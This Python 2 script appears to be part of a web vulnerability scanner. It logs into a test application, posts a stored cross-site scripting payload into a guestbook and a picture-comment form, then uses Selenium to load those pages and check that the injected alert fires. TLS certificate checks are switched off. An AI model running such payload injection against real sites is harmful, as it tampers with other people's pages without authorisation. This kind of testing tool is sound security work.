#!/usr/bin/python

import re
import webbrowser, urllib, urllib2, cookielib, ssl

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait # available since 2.4.0
from selenium.webdriver.support import expected_conditions as EC # available since 2.26.0
from selenium.common.exceptions import NoSuchElementException, NoAlertPresentException
import time

# blacklist of button values to avoid
blacklist = ("cancel", "remove", "delete")
username = "scanner1"
password = "scanner1"
url = "https://app1.com/users/login.php"


#===== Start of requests powered attacker====
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.session()

urlComponents = url.split("/")
root = urlComponents[0]+"//"+ urlComponents[2]

def check_for_more_form(r):
	checkForForm = True
	while checkForForm:
		insideForm = False
		submitForm = False
		newTarget = None
		formMethod = None
		param = {}

		# check if need to submit form again (eg. if there is a preview stage)
		for line in r.text.splitlines():
			if "<form" in line.lower():
				found =  re.match(r".*action\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
				if found:
					newTarget = found.group(1)
					if "http" not in newTarget:
						newTarget = root + newTarget
				found =  re.match(r".*method\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
				if found:
					formMethod = found.group(1)
				insideForm = True
				param.clear()
				print "entered form"
			elif "</form" in line.lower():
				insideForm = False
				print "exited form"
			if insideForm:
				if "input" in line.lower() and "submit" in line.lower():
					if any(s in line.lower() for s in blacklist):
						newTarget = None
						formMethod = None
						param.clear
				elif "input" in line:
					name = ""
					value = ""
					found =  re.match(r".*name\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
					if found:
						name = found.group(1)
					found =  re.match(r".*value\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
					if found:
						value = found.group(1)
					if not found or not value.strip():
						insideForm = False
						newTarget = None
						formMethod = None
						param.clear()
					param.update({name:value})
					print name + " " + value
				elif "textarea" in line:
					insideForm = False
					newTarget = None
					formMethod = None
					param.clear()

		if newTarget and formMethod:
			print newTarget
			if "post" in formMethod.lower():
				r = session.post(newTarget, data=param, verify=False)
			elif "get" in formMethod.lower():
				r = requests.get(url, params=param, verify=False)
		else:
			checkForForm = False

login_data = dict(username='scanner1', password='scanner1')
logoutText = "logout"
r = session.post("https://app1.com/users/login.php", data=login_data, verify=False)

if logoutText in r.text: 
	print "logged in successfully"
else:
	print "not logged in sucessfully"

url ="https://app1.com/guestbook.php"
exploit_data = dict(name="Test",comment="<script>alert('XSS');</script>") #build params
r = session.post(url, data=exploit_data, verify=False)
print "attacked " + url + " ..."
check_for_more_form(r)

url ="https://app1.com/pictures/view.php?pidid=13"
exploit_data = dict(picid="13",comment="<script>alert('XSS');</script>") #build params
r = session.post(url, data=exploit_data, verify=False)
print "attacked " + url + " ..."
check_for_more_form(r)


#===== Start of selenium powered verifier====
driver = webdriver.Firefox()
usernameName = "username"
passwordName = "password"
submitText = "login"
username = "scanner1"
password = "scanner1"
logoutText = "logout"
# load login page
driver.get("https://app1.com/users/login.php")

# methods for checking if item exists
def check_element_exists(name):
    try:
        driver.find_element_by_name(name)
    except NoSuchElementException:
        return False
    return True

def check_submit_btn_exists(name):
    try:
        driver.find_element_by_xpath("//input[@type='submit' and @value='"+name+"']")
    except NoSuchElementException:
        return False
    return True

if check_element_exists(usernameName):
	print "login found"
	inputElement = driver.find_element_by_name(usernameName)
	inputElement.send_keys(username)
else:
	print "login field not found"

if check_element_exists(passwordName):
	print "password found"
	inputElement = driver.find_element_by_name(passwordName)
	inputElement.send_keys(password)
else:
	print "password field not found"

if check_submit_btn_exists(submitText):
	print "submit button found"
	inputElement = driver.find_element_by_xpath("//input[@type='submit' and @value='"+submitText+"']")
	inputElement.click()
else:
	print "submit button not found"

time.sleep(3) # delay for page to load

if logoutText in driver.page_source: #.find(logoutText)
	print "logged in successfully"
else:
	print "not logged in sucessfully"

#==== Verifying attack on https://app1.com/guestbook.php
attackString = "XSS"
driver.get("https://app1.com/guestbook.php")
try:
# Go through all alerts until attackString found
	while EC.alert_is_present():
	    alert = driver.switch_to_alert()
	    if attackString in alert.text:
	    	print "exploit verified in " + driver.current_url
	    alert.accept()
	    time.sleep(2)
except NoAlertPresentException:
	print "Cleared all alerts on page"

time.sleep(3)

#==== Verifying attack on https://app1.com/pictures/view.php?pidid=13
attackString = "XSS"
driver.get("https://app1.com/pictures/view.php?pidid=13")
try:
# Go through all alerts until attackString found
	while EC.alert_is_present():
	    alert = driver.switch_to_alert()
	    if attackString in alert.text:
	    	print "exploit verified in " + driver.current_url
	    alert.accept()
	    time.sleep(2)
except NoAlertPresentException:
	print "Cleared all alerts on page"

time.sleep(3)

driver.quit()